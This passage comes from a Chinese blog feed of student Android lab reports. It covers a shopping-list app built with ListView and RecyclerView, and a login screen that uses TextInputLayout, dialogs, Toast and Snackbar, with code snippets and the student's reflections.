class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/shoppinglist"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"0dp"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:visibility</span>=<span class="string">"gone"</span>/&gt;</span>//隐藏布局，首页面为商品列表</span><br></pre></td></tr></table></figure><p>.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">shopListView = (ListView) findViewById(R.id.shoppinglist);</span><br><span class="line">simpleAdapter = <span class="keyword">new</span> SimpleAdapter(<span class="keyword">this</span>, shopList, R.layout.shoplist_layout,</span><br><span class="line">        <span class="keyword">new</span> String[]&#123;<span class="string">"letter"</span>, <span class="string">"name"</span>, <span class="string">"price"</span>&#125;, <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;R.id.letter, R.id.name, R.id.price&#125;);</span><br><span class="line">shopListView.setAdapter(simpleAdapter);  <span class="comment">//匹配数据</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//长按</span></span><br><span class="line">shopListView.setOnItemLongClickListener(<span class="keyword">new</span> AdapterView.OnItemLongClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onItemLongClick</span><span class="params">(AdapterView&lt;?&gt; parent, View view, <span class="keyword">final</span> <span class="keyword">int</span> position, <span class="keyword">long</span> id)</span> </span>&#123;……&#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//单击</span></span><br><span class="line">shopListView.setOnItemClickListener(<span class="keyword">new</span> AdapterView.OnItemClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onItemClick</span><span class="params">(AdapterView&lt;?&gt; parent, View view, <span class="keyword">int</span> position, <span class="keyword">long</span> id)</span> </span>&#123;……&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ol start="2"><li>RecycleView布局实现商品列表，id为goodslist。因为RecycleView是support-v7包中的新组建，提供了插拔式体验，相比LayoutView更加灵活。使用时需要添加相关依赖，具体操作可以快捷键ctrl+shift+Alt+s添加。</li></ol><p>RecycleView自定义实现RecycleView.VieWHolder，ViewHolder为的是ListView、RecycleView滚动时快速设置值，而不必每次重新创建很多对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ViewHolder</span> <span class="keyword">extends</span> <span class="title">RecyclerView</span>.<span class="title">ViewHolder</span> </span>&#123;</span><br><span class="line">    <span class="comment">//获取实例</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ViewHolder <span class="title">get</span><span class="params">(Context context, ViewGroup parent, <span class="keyword">int</span> itemId)</span> </span>&#123;……&#125;</span><br><span class="line"><span class="comment">//将子view存入一个数组中</span></span><br><span class="line">    <span class="keyword">public</span> &lt;T extends View&gt; <span class="function">T <span class="title">getView</span><span class="params">(<span class="keyword">int</span> viewId)</span> </span>&#123;……&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RecycleView自定义实现RecycleView.Adapter，根据不同视图类型创建对应的布局，并且绑定数据。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonAdapter</span> <span class="keyword">extends</span> <span class="title">RecyclerView</span>.<span class="title">Adapter</span>&lt;<span class="title">ViewHolder</span>&gt;</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span><span class="comment">//创建对应item视图，并返回相应的ViewHolder</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ViewHolder <span class="title">onCreateViewHolder</span><span class="params">(<span class="keyword">final</span> ViewGroup parent, <span class="keyword">int</span> viewType)</span> </span>&#123;……&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span><span class="comment">//绑定数据到正确的item视图上</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onBindViewHolder</span><span class="params">(<span class="keyword">final</span> ViewHolder holder, <span class="keyword">int</span> position)</span> </span>&#123;…&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span><span class="comment">//获取item视图总数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getItemCount</span><span class="params">()</span> </span>&#123;……&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">OnItemClickListener</span> </span>&#123;……&#125;<span class="comment">//添加监听器接口函数，再在onBindViewHolder中绑定数据</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setOnItemClickListener</span><span class="params">(OnItemClickListener onItemClickListener)</span></span>&#123;……&#125;</span><br></pre></td></tr></table></figure><p>LayoutManager布局管理器，绑定数据；AnimationAdapter设置动画；OnItemClickListener设置监听器，实现单击与长按功能。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">   goodsRecyclerView = (RecyclerView) findViewById(R.id.goodslist);</span><br><span class="line"><span class="comment">//匹配数据</span></span><br><span class="line">   goodsRecyclerView.setLayoutManager(<span class="keyword">new</span> LinearLayoutManager(<span class="keyword">this</span>));</span><br><span class="line">   <span class="comment">//添加动画</span></span><br><span class="line">   animationAdapter = <span class="keyword">new</span> ScaleInAnimationAdapter(goodsListAdapter);</span><br><span class="line">   animationAdapter.setDuration(<span class="number">1000</span>);</span><br><span class="line">   goodsRecyclerView.setAdapter(animationAdapter);</span><br><span class="line">   goodsRecyclerView.setItemAnimator(<span class="keyword">new</span> OvershootInLeftAnimator());</span><br><span class="line">   <span class="comment">//单击与长按</span></span><br><span class="line">   goodsListAdapter.setOnItemClickListener(<span class="keyword">new</span> CommonAdapter.OnItemClickListener()&#123;……&#125;);</span><br></pre></td></tr></table></figure><ol><li>商品列表与购物车列表实现在同一个Activity中，通过FloatingActionButton（需要添加依赖）图片按钮实现。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">switchButton = (FloatingActionButton)findViewById(R.id.switch_button);</span><br><span class="line">   switchButton.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">       <span class="meta">@Override</span></span><br><span class="line">       <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">           <span class="keyword">if</span>(goodsRecyclerView.getVisibility() == view.VISIBLE) &#123;</span><br><span class="line">               goodsRecyclerView.setVisibility(view.GONE);</span><br><span class="line">               shopListView.setVisibility(View.VISIBLE);</span><br><span class="line">               switchButton.setImageResource(R.drawable.mainpage);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">else</span> <span class="keyword">if</span>(shopListView.getVisibility() == view.VISIBLE) &#123;</span><br><span class="line">               goodsRecyclerView.setVisibility(view.VISIBLE);</span><br><span class="line">               shopListView.setVisibility(view.GONE);</span><br><span class="line">               switchButton.setImageResource(R.drawable.shoplist);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;);</span><br></pre></td></tr></table></figure><ol><li>创建新的活动，响应单击事件，并设置该活动布局。</li></ol><p>RelativeLayout: 相对布局，设置占顶部1/3的图片信息，包括商品图片、商品名字、返回按钮、收藏按钮；</p><p>LinerLayout：线性布局，设置下面其他的列表信息，指定id，可以通过适配器匹配数据；</p><p>View：通过设定背景颜色以及宽高来定义分隔线；</p><ol><li>设置事件响应，包括单击，返回等等</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//单击跳转（活动1）</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(<span class="keyword">int</span> position)</span> </span>&#123;</span><br><span class="line">       String goodsName = goodsList.get(position).get(<span class="string">"name"</span>).toString();</span><br><span class="line">       Intent intent = <span class="keyword">new</span> Intent(MainActivity.<span class="keyword">this</span>, GoodsInformation.class);</span><br><span class="line">       intent.putExtra(<span class="string">"name"</span>, goodsName);</span><br><span class="line">       startActivityForResult(intent, <span class="number">1</span>);</span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">//接收点击位置的参数（活动2）</span></span><br><span class="line">   Bundle extras = getIntent().getExtras();</span><br><span class="line">   <span class="keyword">if</span>(extras != <span class="keyword">null</span>) &#123;</span><br><span class="line">       data = extras.getString(<span class="string">"name"</span>);<span class="comment">//“name”与活动1匹配</span></span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; inforList.size(); i++) &#123;</span><br><span class="line">           <span class="keyword">if</span>(inforList.get(i).get(<span class="string">"name"</span>).toString().equals(data)) &#123;</span><br><span class="line">               pos = i;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">//得到pos，就可以匹配相应的数据，再显示到布局</span></span><br></pre></td></tr></table></figure><h3 id="3 实验遇到困难以及解决思路"><a class="header-anchor" href="#3 实验遇到困难以及解决思路" aria-hidden="true">¶</a> 3 实验遇到困难以及解决思路</h3><blockquote><ol><li>为了添加一些新的控件而添加新的依赖，根据实验文档添加依赖综合后总是会报错，有时会提示版本过低等原因，但又不知道具体应该怎样添加哪个版本的，根据网上资料，通过快捷键Ctrl+Shift+Alter+S可以打开编译的依赖库，查询实验文档提示的关键词，就可以找到对应的依赖。综合后发现之前的问题没有出现，反而是弹出图片错误，原因是图片命名问题，大写字母都改为小写就解决了，不知道是故意设的bug。</li><li>使用RecyView比较麻烦，还要自定义ViewHolder与Adapter，虽然给出了代码，但还是不太理解，最后还是通过百度，找到关于RecyView的相关介绍，了解其相关功能以及其调用的一些函数的具体操作。所以觉得要用到一些特殊的控件，可以线了解其相关函数的作用，才能更好理解。</li><li>布局文件较多，对应的id混淆，调用的时候不会报错，调试的时候就是各种闪退，最后，不同文件有相同的标签的，id都要设置为不同，在事件处理中，以及适配器匹配数据的时候，需要认请变量名以及id。一个活动一般对应打开一个布局，所以活动中的id就要与布局中指定的id一一对应。实验中还因为把商品列表goodsList与购物车列表shopList搞错，导致添加进购物车的商品点击后是按商品列表中的顺序。</li><li>单击无法跳转到另一个活动，直接闪退，打开Android Monitor，显示的是事件处理intent的启动startActivity出问题，但是看了半天都没找到问题，最后将另一个活动的代码全部注释，在一点点调试，最后发现是更多商品信息下面的列表有问题，在商品详情中只定义了一个ListLayout，以为适配器自动把全部信息填充进去，而代码中是匹配列表中的每一项，即要指定TextView的id。改正错误就不会闪退了。</li></ol></blockquote><h2 id="五、课后实验结果"><a class="header-anchor" href="#五、课后实验结果" aria-hidden="true">¶</a> 五、课后实验结果</h2><p>无</p><h2 id="六、实验思考及感想"><a class="header-anchor" href="#六、实验思考及感想" aria-hidden="true">¶</a> 六、实验思考及感想</h2><blockquote><ol><li>感觉Android越来越难，第一次只是写布局文件，还好一些，只是调调位置，到后面要写事件处理，涉及到Java代码层，就觉得开始难了，之前没学过Java语言，对一些变量类型String（大写的S）以及重载等等都不熟，最近把Java基础语法看完才觉得与C/C++很相近，代码也比较好理解了，但对于一些控件调用的函数，现在虽然知道了它的作用，下次不一定能记得调用哪些参数。</li><li>实验文档总会有一些扩展的模块，虽然给出代码但还不是很能理解，每次用的时候总得百度一遍。实验文档内容很多，在做实验的时候跟文档的顺序都跟不上，有时候写完狗，才发现后面有的没有用到，很难定位到自己的需要实现的地方。</li><li>基础差，做得慢，但动手做还是有收获的，知道怎么去添加依赖，怎样快速添加布局以及函数等，而不是一个字母一个字母的敲。实验的安排比较紧凑，都是跳跃式学习，想要真正掌握还是多练多查。</li></ol></blockquote><p><a href="https://github.com/YH-Chen/Android_lab" target="_blank" rel="noopener"><strong>Github</strong></a></p><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.6.0/katex.min.css">]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Android" scheme="http://www.danboard.me/categories/Android/"/>
    
    
      <category term="android" scheme="http://www.danboard.me/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>【Android】Lab2_事件处理</title>
    <link href="http://www.danboard.me/%E3%80%90Android%E3%80%91Lab2-%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86/"/>
    <id>http://www.danboard.me/【Android】Lab2-事件处理/</id>
    <published>2018-05-12T14:46:43.000Z</published>
    <updated>2018-09-29T14:18:51.454Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://user-images.githubusercontent.com/32091554/44004940-ca3e00c6-9e9d-11e8-84d4-ffeb47c183a3.jpg" alt="sysu"></p><a id="more"></a><h2 id="一  实验题目"><a class="header-anchor" href="#一  实验题目" aria-hidden="true">¶</a> 一 实验题目</h2><p>1、了解 Android 编程基础</p><p>2、熟悉 ImageView、Button、RadioButton 等基本控件，能够处理这些控件的基本事件</p><p>3、学会弹出基本的对话框，能够定制对话框中的内容，能对确定和取消按钮的事件做处理</p><h2 id="二 实现内容"><a class="header-anchor" href="#二 实现内容" aria-hidden="true">¶</a> 二 实现内容</h2><p>实现一个 Android 应用，界面呈现要求如下：</p><p>1、该界面为应用启动后看到的第一个界面</p><p><img src="http://oxv1k8kvi.bkt.clouddn.com/18-5-12/16745043.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-5-12/16745043.jpg"></p><p>2、输入学号和密码的控件要求用 TextInputLayout 实现</p><p>3、点击图片，弹出对话框如下图：</p><p><img src="http://oxv1k8kvi.bkt.clouddn.com/18-5-12/20093596.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-5-12/20093596.jpg"></p><p>点击“拍摄”选项，弹出 Toast 信息“您选择了[拍摄]”；</p><p>点击“从相册选择”选项，弹出 Toast 信息“您选择了[从相册选择]“；</p><p>点击“取消”按钮，弹出 Toast 信息“您选择了[取消]”</p><p>4、切换 RadioButton 的选项，弹出 Snackbar 提示“您选择了 xx”；</p><p>例如从选项“学生”切换到选项“教职工”，则提示“您选择了教职工”；</p><p><img src="http://oxv1k8kvi.bkt.clouddn.com/18-5-12/76831864.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-5-12/76831864.jpg"></p><p>点击 Snackbar 上的“确定”按钮，则弹出 Toast 信息“Snackbar 的确定按钮被点击了”</p><p>5、点击登录按钮 依次判断学号是否为空，密码是否为空，用户名和密码是否正确（正确的学号和密 码分别为“123456”，“6666”）；不正确则给出错误信息，如学号和密码都正确则提</p><p>示“登陆成功”，如图：</p><p><img src="http://oxv1k8kvi.bkt.clouddn.com/18-5-12/19356131.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-5-12/19356131.jpg"></p><p>6、点击注册按钮 如果切换选项时，RadioButton 选中的是“学生”，那么弹出 Snackbar 信息“学生注册 功能尚未启用”，如果选中的是“教职工”，那么弹出 Toast 信息“教职工注册功能尚未启用”。</p><p><img src="http://oxv1k8kvi.bkt.clouddn.com/18-5-12/32546273.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-5-12/32546273.jpg"></p><h2 id="三  课堂实验结果"><a class="header-anchor" href="#三  课堂实验结果" aria-hidden="true">¶</a> 三 课堂实验结果</h2><p>1、实验截图</p><p>1）启动界面</p><p><img src="http://oxv1k8kvi.bkt.clouddn.com/18-5-12/41199903.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-5-12/41199903.jpg"></p><p>2）图片-&gt;对话框</p><p><img src="http://oxv1k8kvi.bkt.clouddn.com/18-5-12/82273186.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-5-12/82273186.jpg"><img src="http://oxv1k8kvi.bkt.clouddn.com/18-5-12/19202738.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-5-12/19202738.jpg"></p><p>3）单选按钮</p><p><img src="http://oxv1k8kvi.bkt.clouddn.com/18-5-12/42962153.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-5-12/42962153.jpg"><img src="http://oxv1k8kvi.bkt.clouddn.com/18-5-12/53294079.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-5-12/53294079.jpg"></p><p>4）登陆按钮</p><p><img src="http://oxv1k8kvi.bkt.clouddn.com/18-5-12/95852798.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-5-12/95852798.jpg"><img src="http://oxv1k8kvi.bkt.clouddn.com/18-5-12/60279420.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-5-12/60279420.jpg"><img src="http://oxv1k8kvi.bkt.clouddn.com/18-5-12/28364652.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-5-12/28364652.jpg"><img src="http://oxv1k8kvi.bkt.clouddn.com/18-5-12/22844418.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-5-12/22844418.jpg"></p><p>5）注册按钮</p><p><img src="http://oxv1k8kvi.bkt.clouddn.com/18-5-12/36790996.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-5-12/36790996.jpg"></p><p>2、实验步骤以及关键代码</p><p><strong>布局xml文件</strong></p><p>1）启动界面，布局参照<a href="http://www.danboard.me/%E3%80%90Android%E3%80%91Lab1-%E5%9F%BA%E6%9C%ACUI%E7%95%8C%E9%9D%A2%E8%AE%BE%E8%AE%A1/"><code>Lab1</code></a></p><p>2）添加TextInputLayout控件</p><blockquote><p>TextInputLayout 是 Android Design Support Library 中的一个控件，用于接受用户输入，与 EditText 配合使用有更好的用户体验， TextInputLayout 集合了输入提示，报错等功能， 并且自带动画效果。</p><p>在lab1中可以看到，输入账号一行包括了TextView的文本提示，EditView的输入控件，如果需要统计字数，还需要再添加控件，而一个TextInputLayout控件可以解决这些问题。</p><p>一个 TextInputLayout 中只能包含一个 EditText 。</p></blockquote><p>首先，添加依赖，位置<code>build.gradle(Module:app)</code>文件，添加</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compile <span class="string">'com.android.support:design:26.0.0-alpha1'</span> <span class="comment">// 选择合适的版本号</span></span><br></pre></td></tr></table></figure><p>也可以在<code>File\Project Structure</code>（快捷键<code>Ctrl+Alter+Shift+S</code>）中查找添加</p><p><img src="http://oxv1k8kvi.bkt.clouddn.com/18-5-13/84612551.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-5-13/84612551.jpg"></p><p>在修改了 build.gradle 文件之后，点击 Sync Now 同步项目。</p><p><img src="http://oxv1k8kvi.bkt.clouddn.com/18-5-13/79225711.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-5-13/79225711.jpg"></p><p>接着，xml布局文件中就可以使用TextInputLayout控件定义学号和密码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/linearlayout"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"vertical"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_marginTop</span>=<span class="string">"20dp"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">app:layout_constraintTop_toBottomOf</span>=<span class="string">"@+id/imageView"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">app:layout_constraintRight_toRightOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">app:layout_constraintLeft_toLeftOf</span>=<span class="string">"parent"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">android.support.design.widget.TextInputLayout</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/editNum"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">EditText</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:hint</span>=<span class="string">"请输入学号"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:textSize</span>=<span class="string">"18sp"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:ems</span>=<span class="string">"12"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:inputType</span>=<span class="string">"number"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">android.support.design.widget.TextInputLayout</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">android.support.design.widget.TextInputLayout</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/editPW"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">EditText</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:hint</span>=<span class="string">"请输入密码"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:textSize</span>=<span class="string">"18sp"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:ems</span>=<span class="string">"12"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:inputType</span>=<span class="string">"textPassword"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">android.support.design.widget.TextInputLayout</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>counterEnabled=“true”// 设置是否可以开启计数器，默认是false</p><p>counterOverflowTextAppearance=&quot;&quot;// 计算器越位后的文字颜色和大小</p><p>counterMaxLength=&quot;&quot; // 计算器的最大字数限制</p><p>errorEnabled=“true”  // 是否允许错误提示</p><p>errorTextAppearance=&quot;&quot;  // 错误提示的文字大小和颜色</p><p>passwordToggleEnabled=“true”// 显示小眼睛</p><p>passwordToggleTint=&quot;@color/colorAccent&quot;  // 给小眼睛上色</p><p>passwordToggleTintMode=“multiply”// 小眼睛的显示方式</p><p>注意：显示小眼睛，需要设置为密码格式。</p></blockquote><p><strong>逻辑实现java文件</strong></p><p>3）点击图片，弹出对话框</p><p>首先创建一个对话框，对图像控件设置监听器，点击图片的时候触发，显示对话框。</p><p>通过布局设定的id创建图像控件的一个对象，以便进行操作</p><blockquote><p>findViewById(R.id.xx)</p></blockquote><p>创建对话框</p><blockquote><p>AlertDialog.Builder 初始化一个对话框</p><p>setTitle 设置标题</p><p>setItems 设置对话框条目</p><p>setPositiveButton 设置正向按钮</p><p>setNegativeButton 设置反向按钮</p><p>create 创建对话框</p><p>show 显示对话框</p></blockquote><p>设置监听器</p><ul><li><p>第一处，对话框条目点击触发，弹出Toast信息。传入参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> DialogInterface.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialog, <span class="keyword">int</span> which)</span> </span>&#123;</span><br><span class="line"><span class="comment">// 执行操作，这里是弹出Toast信息</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Toast.makeText(Context context, CharSequence text, int duration)</p><p>context：上下文，MainActivity.this主活动页面 or getApplication()获取当前页面</p><p>text：文本信息</p><p>duration：显示持续时间，Toast.LENGTH_SHORT | Toast.LENGTH_LONG</p></blockquote></li><li><p>第二处，监听图像控件，通过<code>setOnClickListener</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 执行操作，这里是显示对话框</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li></ul><p>总体</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置对话框</span></span><br><span class="line"><span class="keyword">final</span> String[] items = &#123;<span class="string">"拍摄"</span>, <span class="string">"从相册选择"</span>&#125;;</span><br><span class="line"><span class="keyword">final</span> AlertDialog.Builder alertdialog = <span class="keyword">new</span> AlertDialog.Builder(<span class="keyword">this</span>);</span><br><span class="line">alertdialog.setTitle(<span class="string">"上传图片"</span>)</span><br><span class="line">        .setItems(items, <span class="keyword">new</span> DialogInterface.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span 